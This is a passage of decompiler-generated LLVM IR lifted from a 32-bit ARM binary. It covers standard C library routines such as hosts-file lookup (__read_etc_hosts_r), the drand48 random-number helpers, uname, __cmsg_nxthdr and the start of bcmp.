  %v1_33720 = add i32 %v0_33720, 4
  store i32 %v1_33720, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_33724

dec_label_pc_33724:                               ; preds = %bb, %entry, %dec_label_pc_336fc
  %v1_33728 = phi i32 [ -1, %bb ], [ %v2_336e0, %entry ], [ %v1_33720, %dec_label_pc_336fc ]
  %v2_33724 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_33724, i32* @r4, align 4
  store i32 %v9_336cc, i32* @r6, align 4
  ret i32 %v1_33728

; uselistorder directives
  uselistorder i32 %v2_336e0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder label %dec_label_pc_33724, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -33068), i32* @r0, align 4
  %v1_33744 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -33068))
  ret i32 %v1_33744

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 1, 3, 2 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg5 to i32
  store i32 %tmp20, i32* %stack_var_0, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_3375c = load i32, i32* @r4, align 4
  %v6_3375c = load i32, i32* @r5, align 4
  %v9_3375c = load i32, i32* @r6, align 4
  %v12_3375c = load i32, i32* @r7, align 4
  %v15_3375c = load i32, i32* @r8, align 4
  %v18_3375c = load i32, i32* @sb, align 4
  %v21_3375c = load i32, i32* @sl, align 4
  %v24_3375c = load i32, i32* @fp, align 4
  store i32 %arg7, i32* @r5, align 4
  store i32 %arg9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v2_33784 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v2_33784, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @fp, align 4
  %v3_33798 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_33798, i32* @r7, align 4
  %tmp = icmp ult i32 %arg7, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_337a4

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_33944

dec_label_pc_337a4:                               ; preds = %entry
  %v2_337a4 = icmp eq i32 %arg1, 0
  br i1 %v2_337a4, label %dec_label_pc_337ac, label %dec_label_pc_337cc

dec_label_pc_337ac:                               ; preds = %dec_label_pc_337a4
  %v0_337ac = call i32 @__open_etc_hosts()
  store i32 %v0_337ac, i32* @r6, align 4
  %v2_337b0 = icmp eq i32 %v0_337ac, 0
  br i1 %v2_337b0, label %dec_label_pc_337b8, label %dec_label_pc_337cc

dec_label_pc_337b8:                               ; preds = %dec_label_pc_337ac
  store i32 %arg8, i32* %r2.global-to-local, align 4
  %v2_337bc = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v2_337bc, align 4
  %v0_337c0 = call i32 @__GI___errno_location()
  %v1_337c4 = inttoptr i32 %v0_337c0 to i32*
  %v2_337c4 = load i32, i32* %v1_337c4, align 4
  store i32 %v2_337c4, i32* @sb, align 4
  br label %dec_label_pc_33944

dec_label_pc_337cc:                               ; preds = %dec_label_pc_337ac, %dec_label_pc_337a4
  %v1_337ec = phi i32 [ %v0_337ac, %dec_label_pc_337ac ], [ %arg1, %dec_label_pc_337a4 ]
  %v0_337d0 = load i32, i32* @r4, align 4
  %v2_337d0 = add i32 %v0_337d0, -33056
  store i32 %v2_337d0, i32* @r4, align 4
  %v2_337d4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_337ec = add i32 %v1_337ec, 8
  %v3_337ec = inttoptr i32 %v2_337ec to i32*
  store i32 48, i32* %v3_337ec, align 4
  store i32 %arg9, i32* %r3.global-to-local, align 4
  %v0_337f4 = load i32, i32* @r5, align 4
  %v1_337f4 = add i32 %v0_337f4, -48
  store i32 %v1_337f4, i32* %r1.global-to-local, align 4
  %v0_337f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_337f8 = add i32 %v0_337f8, 24
  store i32 %v1_337f8, i32* @ip, align 4
  %v0_337fc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_337fc, i32* @sb, align 4
  %v0_33800 = load i32, i32* @lr, align 4
  %v1_33800 = add i32 %v0_33800, 32
  store i32 %v1_33800, i32* @sl, align 4
  %v1_33804 = load i32, i32* @r6, align 4
  %v2_33804 = add i32 %v1_33804, 16
  %v3_33804 = inttoptr i32 %v2_33804 to i32*
  store i32 %v1_337f4, i32* %v3_33804, align 4
  %v0_33808 = load i32, i32* @r4, align 4
  %v0_3380c = load i32, i32* @ip, align 4
  store i32 %v0_3380c, i32* %stack_var_-64, align 4
  %v0_33810 = load i32, i32* %r2.global-to-local, align 4
  %v1_33810 = load i32, i32* %r3.global-to-local, align 4
  %v2_33810 = inttoptr i32 %v1_33810 to i32*
  store i32 %v0_33810, i32* %v2_33810, align 4
  %v0_33814 = load i32, i32* @lr, align 4
  %v1_33814 = load i32, i32* @r6, align 4
  %v2_33814 = add i32 %v1_33814, 4
  %v3_33814 = inttoptr i32 %v2_33814 to i32*
  store i32 %v0_33814, i32* %v3_33814, align 4
  %v2_33844 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_33918

dec_label_pc_3381c:                               ; preds = %dec_label_pc_33918
  %v3_3381c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_3381c, i32* %r1.global-to-local, align 4
  %v0_33820 = load i32, i32* @fp, align 4
  %v7_33820 = icmp eq i32 %v0_33820, 1
  %v1_33824 = add i32 %v3_3381c, 4
  store i32 %v1_33824, i32* @r5, align 4
  %v1_33828 = load i32, i32* @r7, align 4
  %v2_33828 = add i32 %v1_33828, 4
  %v3_33828 = inttoptr i32 %v2_33828 to i32*
  store i32 %v1_33824, i32* %v3_33828, align 4
  br i1 %v7_33820, label %dec_label_pc_33944, label %dec_label_pc_33830

dec_label_pc_33830:                               ; preds = %dec_label_pc_3381c
  %v0_33830 = load i32, i32* @fp, align 4
  %v7_33830 = icmp eq i32 %v0_33830, 2
  br i1 %v7_33830, label %dec_label_pc_3383c, label %dec_label_pc_33860.preheader

dec_label_pc_33860.preheader:                     ; preds = %dec_label_pc_33830
  %v1_33834 = load i32, i32* @r5, align 4
  %v1_3386026 = inttoptr i32 %v1_33834 to i32*
  %v2_3386027 = load i32, i32* %v1_3386026, align 4
  store i32 %v2_3386027, i32* %r3.global-to-local, align 4
  store i32 %v2_3386027, i32* %r1.global-to-local, align 4
  %v2_3386429 = icmp eq i32 %v2_3386027, 0
  %v1_3386c30 = add i32 %v1_33834, 4
  store i32 %v1_3386c30, i32* @r4, align 4
  br i1 %v2_3386429, label %dec_label_pc_33918, label %dec_label_pc_33854

dec_label_pc_3383c:                               ; preds = %dec_label_pc_33830
  %v0_3383c = load i32, i32* %r1.global-to-local, align 4
  %v1_3383c = inttoptr i32 %v0_3383c to i32*
  %v2_3383c = load i32, i32* %v1_3383c, align 4
  store i32 %v2_3383c, i32* @r1, align 4
  %v3_33844 = call i32 @__GI_strcoll(i8* %v2_33844, i32 %v2_3383c)
  %v2_33848 = icmp eq i32 %v3_33844, 0
  br i1 %v2_33848, label %dec_label_pc_33878, label %dec_label_pc_33918

dec_label_pc_33854:                               ; preds = %dec_label_pc_33860.preheader, %dec_label_pc_33854.dec_label_pc_33860_crit_edge
  %v2_3386031 = phi i32 [ %v2_33860, %dec_label_pc_33854.dec_label_pc_33860_crit_edge ], [ %v2_3386027, %dec_label_pc_33860.preheader ]
  %v3_33854 = call i32 @__GI_strcasecmp(i8* %v2_33844, i32 %v2_3386031)
  %v2_33858 = icmp eq i32 %v3_33854, 0
  br i1 %v2_33858, label %dec_label_pc_33878, label %dec_label_pc_33854.dec_label_pc_33860_crit_edge

dec_label_pc_33854.dec_label_pc_33860_crit_edge:  ; preds = %dec_label_pc_33854
  %v0_33860.pre = load i32, i32* @r4, align 4
  %v1_33860 = inttoptr i32 %v0_33860.pre to i32*
  %v2_33860 = load i32, i32* %v1_33860, align 4
  store i32 %v2_33860, i32* %r3.global-to-local, align 4
  store i32 %v2_33860, i32* %r1.global-to-local, align 4
  %v2_33864 = icmp eq i32 %v2_33860, 0
  %v1_3386c = add i32 %v0_33860.pre, 4
  store i32 %v1_3386c, i32* @r4, align 4
  br i1 %v2_33864, label %dec_label_pc_33918, label %dec_label_pc_33854

dec_label_pc_33878:                               ; preds = %dec_label_pc_33854, %dec_label_pc_3383c
  %v0_33878 = load i32, i32* @r5, align 4
  %v1_33878 = inttoptr i32 %v0_33878 to i32*
  %v2_33878 = load i32, i32* %v1_33878, align 4
  store i32 %v2_33878, i32* %r3.global-to-local, align 4
  %v4_33878 = add i32 %v0_33878, 4
  store i32 %v4_33878, i32* @r5, align 4
  %v2_3387c = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_3387c, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_33884 = load i32, i32* @r7, align 4
  %v2_33884 = inttoptr i32 %v1_33884 to i32*
  store i32 %v2_33878, i32* %v2_33884, align 4
  %v0_33888 = load i32, i32* @lr, align 4
  %v1_33888 = load i32, i32* @ip, align 4
  %v2_33888 = add i32 %v1_33888, 4
  %v3_33888 = inttoptr i32 %v2_33888 to i32*
  store i32 %v0_33888, i32* %v3_33888, align 4
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v0_33890 = load i32, i32* @r8, align 4
  %v7_33890 = icmp eq i32 %v0_33890, 2
  %v0_33894 = load i32, i32* @r5, align 4
  %v1_33894 = load i32, i32* @r7, align 4
  %v2_33894 = add i32 %v1_33894, 4
  %v3_33894 = inttoptr i32 %v2_33894 to i32*
  store i32 %v0_33894, i32* %v3_33894, align 4
  %v0_33898 = load i32, i32* @ip, align 4
  %v1_33898 = load i32, i32* @r7, align 4
  %v2_33898 = add i32 %v1_33898, 16
  %v3_33898 = inttoptr i32 %v2_33898 to i32*
  store i32 %v0_33898, i32* %v3_33898, align 4
  %v0_3389c = load i32, i32* @sl, align 4
  %v1_3389c = load i32, i32* %r2.global-to-local, align 4
  %v2_3389c = add i32 %v1_3389c, 24
  %v3_3389c = inttoptr i32 %v2_3389c to i32*
  store i32 %v0_3389c, i32* %v3_3389c, align 4
  br i1 %v7_33890, label %dec_label_pc_338a4, label %dec_label_pc_338d4

dec_label_pc_338a4:                               ; preds = %dec_label_pc_33878
  %v3_338a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_338a4, i32* %r3.global-to-local, align 4
  %v0_338a8 = load i32, i32* @r8, align 4
  %v1_338ac = inttoptr i32 %v3_338a4 to i32*
  %v2_338ac = load i32, i32* %v1_338ac, align 4
  store i32 %v2_338ac, i32* %r1.global-to-local, align 4
  %v0_338b0 = load i32, i32* @sl, align 4
  store i32 %v0_338b0, i32* %r2.global-to-local, align 4
  %v3_338b4 = inttoptr i32 %v2_338ac to i8*
  %v4_338b4 = call i32 @inet_pton(i32 %v0_338a8, i8* %v3_338b4, i32 %v0_338b0)
  %tmp24 = icmp slt i32 %v4_338b4, 1
  br i1 %tmp24, label %dec_label_pc_33914, label %dec_label_pc_338c0

dec_label_pc_338c0:                               ; preds = %dec_label_pc_338a4
  %v0_338c4 = load i32, i32* @r7, align 4
  %v2_338c4 = inttoptr i32 %arg8 to i32*
  store i32 %v0_338c4, i32* %v2_338c4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_338cc = load i32, i32* @r8, align 4
  %v1_338cc = load i32, i32* @r7, align 4
  %v2_338cc = add i32 %v1_338cc, 8
  %v3_338cc = inttoptr i32 %v2_338cc to i32*
  store i32 %v0_338cc, i32* %v3_338cc, align 4
  %v0_3390c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_33908

dec_label_pc_338d4:                               ; preds = %dec_label_pc_33878
  %v0_338d4 = load i32, i32* @r8, align 4
  %v7_338d4 = icmp eq i32 %v0_338d4, 10
  br i1 %v7_338d4, label %dec_label_pc_338dc, label %dec_label_pc_33914

dec_label_pc_338dc:                               ; preds = %dec_label_pc_338d4
  %v3_338dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_338dc, i32* %r3.global-to-local, align 4
  %v1_338e4 = inttoptr i32 %v3_338dc to i32*
  %v2_338e4 = load i32, i32* %v1_338e4, align 4
  store i32 %v2_338e4, i32* %r1.global-to-local, align 4
  %v0_338e8 = load i32, i32* @sl, align 4
  store i32 %v0_338e8, i32* %r2.global-to-local, align 4
  %v3_338ec = inttoptr i32 %v2_338e4 to i8*
  %v4_338ec = call i32 @inet_pton(i32 10, i8* %v3_338ec, i32 %v0_338e8)
  %tmp25 = icmp slt i32 %v4_338ec, 1
  br i1 %tmp25, label %dec_label_pc_33914, label %dec_label_pc_338f8

dec_label_pc_338f8:                               ; preds = %dec_label_pc_338dc
  store i32 %arg8, i32* @ip, align 4
  %v0_338fc = load i32, i32* @r8, align 4
  %v1_338fc = load i32, i32* @r7, align 4
  %v2_338fc = add i32 %v1_338fc, 8
  %v3_338fc = inttoptr i32 %v2_338fc to i32*
  store i32 %v0_338fc, i32* %v3_338fc, align 4
  %v0_33900 = load i32, i32* @r7, align 4
  %v1_33900 = load i32, i32* @ip, align 4
  %v2_33900 = inttoptr i32 %v1_33900 to i32*
  store i32 %v0_33900, i32* %v2_33900, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_33908

dec_label_pc_33908:                               ; preds = %dec_label_pc_338c0, %dec_label_pc_338f8
  %v0_3390c = phi i32 [ %v0_3390c.pre, %dec_label_pc_338c0 ], [ 16, %dec_label_pc_338f8 ]
  store i32 0, i32* @sb, align 4
  %v1_3390c = load i32, i32* @r7, align 4
  %v2_3390c = add i32 %v1_3390c, 12
  %v3_3390c = inttoptr i32 %v2_3390c to i32*
  store i32 %v0_3390c, i32* %v3_3390c, align 4
  br label %dec_label_pc_3393c

dec_label_pc_33914:                               ; preds = %dec_label_pc_338d4, %dec_label_pc_338dc, %dec_label_pc_338a4
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_33918

dec_label_pc_33918:                               ; preds = %dec_label_pc_33860.preheader, %dec_label_pc_33854.dec_label_pc_33860_crit_edge, %dec_label_pc_3383c, %dec_label_pc_33914, %dec_label_pc_337cc
  %v0_33918 = load i32, i32* @r6, align 4
  store i32 %v2_337d4, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_33808, i32* %r3.global-to-local, align 4
  %v4_33928 = inttoptr i32 %v0_33918 to i32*
  %v5_33928 = call i32 @__GI_config_read(i32* %v4_33928, i32 %v2_337d4, i32 459270, i32 %v0_33808)
  %v2_3392c = icmp eq i32 %v5_33928, 0
  br i1 %v2_3392c, label %dec_label_pc_33934, label %dec_label_pc_3381c

dec_label_pc_33934:                               ; preds = %dec_label_pc_33918
  %v0_33934 = load i32, i32* @fp, align 4
  %v7_33934 = icmp eq i32 %v0_33934, 1
  br i1 %v7_33934, label %dec_label_pc_33944, label %dec_label_pc_3393c

dec_label_pc_3393c:                               ; preds = %dec_label_pc_33934, %dec_label_pc_33908
  %v0_3393c = load i32, i32* @r6, align 4
  %v1_33940 = inttoptr i32 %v0_3393c to i32*
  %v2_33940 = call i32 @__GI_config_close(i32* %v1_33940)
  br label %dec_label_pc_33944

dec_label_pc_33944:                               ; preds = %dec_label_pc_3381c, %.thread, %dec_label_pc_33934, %dec_label_pc_337b8, %dec_label_pc_3393c
  %v0_33944 = load i32, i32* @sb, align 4
  store i32 %v3_3375c, i32* @r4, align 4
  store i32 %v6_3375c, i32* @r5, align 4
  store i32 %v9_3375c, i32* @r6, align 4
  store i32 %v12_3375c, i32* @r7, align 4
  store i32 %v15_3375c, i32* @r8, align 4
  store i32 %v18_3375c, i32* @sb, align 4
  store i32 %v21_3375c, i32* @sl, align 4
  store i32 %v24_3375c, i32* @fp, align 4
  ret i32 %v0_33944

; uselistorder directives
  uselistorder i32 %v2_33860, { 1, 2, 3, 0 }
  uselistorder i32 %v0_33860.pre, { 1, 0 }
  uselistorder i32 %v0_33808, { 1, 0 }
  uselistorder i32 %v2_337d4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 9, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 1, 2, 3, 4, 6, 7, 8, 9, 0 }
  uselistorder i32* %r1.global-to-local, { 7, 1, 2, 3, 4, 6, 5, 8, 0 }
  uselistorder i32 (i32*)* @__GI_config_close, { 2, 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 3, 2, 0, 1 }
  uselistorder i32 10, { 6, 92, 94, 95, 69, 68, 96, 27, 70, 28, 99, 102, 103, 104, 50, 112, 29, 113, 30, 31, 32, 93, 23, 0, 97, 98, 33, 117, 34, 105, 35, 106, 36, 109, 110, 71, 4, 72, 38, 37, 7, 108, 107, 86, 24, 87, 3, 55, 53, 54, 2, 56, 57, 39, 58, 59, 60, 25, 61, 62, 40, 63, 8, 64, 65, 41, 66, 9, 10, 11, 5, 67, 111, 100, 101, 114, 115, 42, 116, 1, 26, 73, 43, 16, 51, 15, 14, 13, 12, 21, 52, 20, 19, 18, 17, 44, 74, 46, 47, 45, 48, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 22, 88, 89, 90, 91, 49 }
  uselistorder i32 (i32, i8*, i32)* @inet_pton, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 37, 38, 39, 40, 41, 42, 43, 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32 -48, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 48, { 4, 18, 19, 5, 27, 28, 20, 21, 22, 23, 29, 6, 0, 31, 7, 32, 33, 1, 34, 8, 35, 9, 37, 38, 39, 24, 10, 30, 36, 25, 40, 41, 26, 11, 12, 13, 14, 15, 16, 3, 2, 17 }
  uselistorder i32 34, { 16, 17, 18, 13, 14, 4, 5, 0, 7, 21, 6, 22, 19, 15, 9, 10, 11, 12, 20, 8, 1, 2, 3 }
  uselistorder i32 %arg9, { 2, 0, 1 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_33944, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_33918, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_33914, { 1, 0, 2 }
  uselistorder label %dec_label_pc_33908, { 1, 0 }
  uselistorder label %dec_label_pc_33854, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_33970 = call i32 @nrand48_r()
  ret i32 %v0_33970
}

define i32 @nrand48_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v6_33980 = load i32, i32* @r5, align 4
  %v0_33988 = load i32, i32* @r2, align 4
  store i32 %v0_33988, i32* @r5, align 4
  %v0_3398c = load i32, i32* @r0, align 4
  store i32 %v0_3398c, i32* @r4, align 4
  %v0_33990 = call i32 @__drand48_iterate()
  store i32 %v0_33990, i32* %r0.global-to-local, align 4
  %v1_33994 = icmp slt i32 %v0_33990, 0
  br i1 %v1_33994, label %.thread8, label %bb

.thread8:                                         ; preds = %entry
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %bb13

bb:                                               ; preds = %entry
  %v3_33998 = load i32, i32* @r4, align 4
  %v4_33998 = add i32 %v3_33998, 4
  %v5_33998 = inttoptr i32 %v4_33998 to i16*
  %v6_33998 = load i16, i16* %v5_33998, align 2
  %v7_33998 = zext i16 %v6_33998 to i32
  %v4_3399c = add i32 %v3_33998, 2
  %v5_3399c = inttoptr i32 %v4_3399c to i16*
  %v6_3399c = load i16, i16* %v5_3399c, align 2
  %v6_339a0 = mul nuw i32 %v7_33998, 32768
  %div = udiv i16 %v6_3399c, 2
  %v7_339a4 = zext i16 %div to i32
  %v8_339a4 = or i32 %v7_339a4, %v6_339a0
  store i32 0, i32* %r0.global-to-local, align 4
  %v4_339b0 = load i32, i32* @r5, align 4
  %v5_339b0 = inttoptr i32 %v4_339b0 to i32*
  store i32 %v8_339a4, i32* %v5_339b0, align 4
  %v1_339bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb13

bb13:                                             ; preds = %.thread8, %bb
  %v1_339bc = phi i32 [ %v1_339bc.pre, %bb ], [ -1, %.thread8 ]
  store i32 %v6_33980, i32* @r5, align 4
  ret i32 %v1_339bc

; uselistorder directives
  uselistorder i16 2, { 0, 14, 15, 16, 13, 1, 2, 17, 18, 19, 20, 3, 4, 21, 5, 6, 22, 7, 8, 23, 9, 10, 11, 12 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp2 = sext i16 %arg1 to i32
  %v4_339c01 = udiv i32 %tmp2, 65536
  %v1_339c4 = trunc i32 %v4_339c01 to i16
  %v4_339c4 = add i32 %arg2, 4
  %v5_339c4 = inttoptr i32 %v4_339c4 to i16*
  store i16 %v1_339c4, i16* %v5_339c4, align 2
  store i16 13070, i16* %tmp, align 2
  store i32 5, i32* %r4.global-to-local, align 4
  %v3_339dc = add i32 %arg2, 16
  %v4_339dc = inttoptr i32 %v3_339dc to i32*
  store i32 -554899859, i32* %v4_339dc, align 4
  %v0_339e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_339e0 = add i32 %arg2, 20
  %v4_339e0 = inttoptr i32 %v3_339e0 to i32*
  store i32 %v0_339e0, i32* %v4_339e0, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v5_339e8 = add i32 %arg2, 2
  %v6_339e8 = inttoptr i32 %v5_339e8 to i16*
  store i16 %arg1, i16* %v6_339e8, align 2
  %v0_339ec = load i32, i32* %r3.global-to-local, align 4
  %v1_339ec = trunc i32 %v0_339ec to i16
  %v4_339ec = add i32 %arg2, 14
  %v5_339ec = inttoptr i32 %v4_339ec to i16*
  store i16 %v1_339ec, i16* %v5_339ec, align 2
  store i32 11, i32* %r3.global-to-local, align 4
  %v4_339f8 = add i32 %arg2, 12
  %v5_339f8 = inttoptr i32 %v4_339f8 to i16*
  store i16 11, i16* %v5_339f8, align 2
  ret i32 0
}

define i32 @"$d"(i32 %arg1) local_unnamed_addr {
dec_label_pc_33a04:
  %v0_33a04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_33a04, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_33a04
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_33a04, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_33a0c = load i32, i32* @r7, align 4
  store i32 %v3_33a0c, i32* %stack_var_-8, align 4
  %v0_33a18 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_33a18, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_33a18, -4095
  br i1 %tmp, label %dec_label_pc_33a38, label %dec_label_pc_33a28

dec_label_pc_33a28:                               ; preds = %entry
  %v0_33a28 = call i32 @__GI___errno_location()
  %v0_33a2c = load i32, i32* %r7.global-to-local, align 4
  %v1_33a2c = sub i32 0, %v0_33a2c
  %v2_33a30 = inttoptr i32 %v0_33a28 to i32*
  store i32 %v1_33a2c, i32* %v2_33a30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_33a38.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_33a38

dec_label_pc_33a38:                               ; preds = %entry, %dec_label_pc_33a28
  %v1_33a3c = phi i32 [ %v0_33a18, %entry ], [ -1, %dec_label_pc_33a28 ]
  %v2_33a38 = phi i32 [ %v3_33a0c, %entry ], [ %v2_33a38.pre, %dec_label_pc_33a28 ]
  store i32 %v2_33a38, i32* @r7, align 4
  ret i32 %v1_33a3c

; uselistorder directives
  uselistorder i32 %v0_33a18, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 58, 36, 19, 18, 121, 123, 122, 120, 33, 35, 30, 29, 114, 113, 55, 54, 110, 69, 53, 119, 118, 117, 116, 115, 28, 27, 112, 111, 109, 108, 107, 106, 50, 105, 63, 73, 62, 61, 13, 52, 51, 104, 103, 102, 49, 14, 0, 15, 60, 80, 10, 68, 22, 34, 59, 101, 47, 100, 99, 41, 40, 57, 46, 20, 39, 44, 98, 97, 96, 45, 64, 26, 25, 24, 95, 43, 42, 72, 71, 70, 31, 32, 3, 9, 12, 23, 94, 8, 11, 79, 77, 7, 93, 1, 21, 6, 83, 56, 67, 74, 5, 38, 92, 84, 37, 66, 4, 82, 76, 75, 81, 91, 90, 89, 88, 87, 65, 2, 86, 48, 85, 78, 17, 16 }
  uselistorder label %dec_label_pc_33a38, { 1, 0 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %v0_33a40 = load i32, i32* @r1, align 4
  %v1_33a40 = inttoptr i32 %v0_33a40 to i32*
  %v2_33a40 = load i32, i32* %v1_33a40, align 4
  %tmp = icmp ult i32 %v2_33a40, 12
  br i1 %tmp, label %dec_label_pc_33a88, label %dec_label_pc_33a4c

dec_label_pc_33a4c:                               ; preds = %entry
  %v1_33a4c = add i32 %v2_33a40, 3
  %v1_33a50 = and i32 %v1_33a4c, -4
  %v0_33a54 = load i32, i32* @r0, align 4
  %v1_33a54 = add i32 %v0_33a54, 16
  %v1_33a58 = inttoptr i32 %v1_33a54 to i32*
  %v2_33a58 = load i32, i32* %v1_33a58, align 4
  %v3_33a58 = add i32 %v0_33a54, 20
  %v4_33a58 = inttoptr i32 %v3_33a58 to i32*
  %v5_33a58 = load i32, i32* %v4_33a58, align 4
  %v2_33a5c = add i32 %v5_33a58, %v2_33a58
  %v2_33a60 = add i32 %v1_33a50, %v0_33a40
  %v1_33a64 = add i32 %v2_33a60, 12
  %tmp1 = icmp ugt i32 %v1_33a64, %v2_33a5c
  br i1 %tmp1, label %dec_label_pc_33a88, label %dec_label_pc_33a70

dec_label_pc_33a70:                               ; preds = %dec_label_pc_33a4c
  %v3_33a70 = inttoptr i32 %v2_33a60 to i32*
  %v4_33a70 = load i32, i32* %v3_33a70, align 4
  %v1_33a74 = add i32 %v4_33a70, 3
  %v1_33a78 = and i32 %v1_33a74, -4
  %v2_33a7c = add i32 %v1_33a78, %v2_33a60
  %v0_33a84 = load i32, i32* @lr, align 4
  %tmp2 = icmp ule i32 %v2_33a7c, %v2_33a5c
  call void @__pseudo_cond_branch(i1 %tmp2, i32 %v0_33a84)
  br label %dec_label_pc_33a88

dec_label_pc_33a88:                               ; preds = %dec_label_pc_33a4c, %entry, %dec_label_pc_33a70
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_33a40, { 1, 0 }
  uselistorder label %dec_label_pc_33a88, { 2, 0, 1 }
}

define i32 @bcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_33a90 = add i32 %arg2, -1
  %v6_33a90 = icmp slt i32 %v1_33a90, 0
  br i1 %v6_33a90, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  %v2_33a9c = add i32 %v1_33a90, %tmp
  %v0_33aa4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_33aa0

dec_label_pc_33aa0:                               ; preds = %bb6, %.thread
  %v0_33aa4 = phi i32 [ %v0_33aa4.pre, %.thread ], [ %v5_33aa4, %bb6 ]
  %v0_33aa0 = phi i32 [ %tmp, %.thread ], [ %v5_33aa0, %bb6 ]
  %v1_33aa0 = inttoptr i32 %v0_33aa0 to i8*
